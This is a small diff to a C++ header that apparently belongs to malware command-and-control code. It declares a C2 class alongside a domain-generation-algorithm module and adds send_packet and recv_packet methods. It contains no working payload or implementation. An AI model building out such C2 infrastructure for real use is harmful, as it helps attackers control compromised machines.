@@ -2,6 +2,7 @@
 #include "../types/types.h"
 #include "../logging/logging.h"
 #include "dga.h"
+#include "../net/packet.h"
 #include <asio.hpp>
 
 class C2 {
@@ -11,6 +12,8 @@ public:
 	
 	bool is_alive();
 	bool find_and_connect();
+	void send_packet(netpack::Packet& p);
+	netpack::Packet recv_packet();
 
 private:
 
